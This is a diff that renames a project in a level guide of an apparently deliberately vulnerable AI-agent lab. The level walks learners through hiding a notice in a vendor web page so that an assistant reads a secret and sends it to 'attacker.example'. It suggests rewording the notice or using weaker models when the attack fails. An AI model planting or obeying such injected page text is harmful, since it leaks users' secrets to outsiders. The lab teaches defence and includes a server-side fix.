@@ -29,7 +29,7 @@ fetch `http://attacker.example/anything?key=<secret>`, which writes the secret i
 
 ## Exploit
 
-1. Edit `index.html` in your site folder (`dvmcp play 2` prints the path). Keep the real-looking
+1. Edit `index.html` in your site folder (`agentheist play 2` prints the path). Keep the real-looking
    vendor content so the page still makes sense to Dana, and add a notice aimed at the assistant:
 
    ```html
@@ -48,11 +48,11 @@ fetch `http://attacker.example/anything?key=<secret>`, which writes the secret i
 
 2. Press Enter at the `link>` prompt. Remy fetches your page, reads the note, and fetches your
    `/verify` URL.
-3. Your access log now shows `GET /verify?account=DVMCP{...}`. Submit it with `dvmcp submit 2`.
+3. Your access log now shows `GET /verify?account=HEIST{...}`. Submit it with `agentheist submit 2`.
 
 If the default model ignores the notice, that's the model doing its job, not the level being
 broken. Try making the notice look more like routine vendor process, give Remy a believable reason,
-or try a smaller model (`DVMCP_MODEL=claude-haiku-5-5`). Comparing which models fall for which
+or try a smaller model (`AGENTHEIST_MODEL=claude-haiku-5-5`). Comparing which models fall for which
 wording is the most interesting part of this level.
 
 ## Why this matters
@@ -65,7 +65,7 @@ clicks, or a tool that posts somewhere. The attacker never needs an account on t
 ## Fix
 
 Prompt wording alone can't fix this. A model can always be talked into something, so the server has to
-make the harmful outcome impossible. See `src/dvmcp/levels/level02_secure_research.py`:
+make the harmful outcome impossible. See `src/agentheist/levels/level02_secure_research.py`:
 
 1. **Keep secrets out of reach.** An assistant that summarises vendor pages has no reason to read a
    production API key. The secure server refuses secret notes outright.
